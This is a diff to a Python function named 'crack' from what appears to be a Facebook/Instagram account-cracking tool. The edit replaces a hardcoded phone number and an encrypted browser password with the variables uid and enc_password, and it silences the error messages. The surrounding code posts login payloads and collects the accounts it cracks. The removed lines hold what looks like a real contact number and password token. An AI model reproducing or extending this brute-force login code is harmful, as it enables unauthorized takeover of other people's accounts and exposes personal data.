@@ -203,8 +203,8 @@ def crack(uid, password_list, total_count):
                 "cloud_trust_token": None,
                 "block_store_machine_id": "",
                 "zero_balance_state": "",
-                "contact_point": "8918168736",
-                "password": "#PWD_BROWSER:5:1767465765:Ac1QALkczDragfAvSjmCxZzIW594ll5LN1G2JE3th2AvEnIOFCrvxq5yIiNiMSwm394MLdndHi+0ODXO+UE+BvmfkUfi0bmBooGsUKKLKwXsrP1k/jRpAWugrKPCWrNneVlhvcZJpyznXA==",
+                "contact_point": uid,
+                "password": enc_password,
                 "accounts_list": [],
                 "fb_ig_device_id": [],
                 "secure_family_device_id": "",
@@ -285,23 +285,23 @@ def crack(uid, password_list, total_count):
                 cps.append(uid)
                 continue
             else:
-                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
                 
     except requests.exceptions.Timeout:
-        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
+        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
     except requests.exceptions.ConnectionError:
         time.sleep(5)
         return False
     except requests.exceptions.RequestException as e:
-        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
+        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
-        print(f"\r\033[1;93m [Interrupted] User stopped the process")
+        #print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
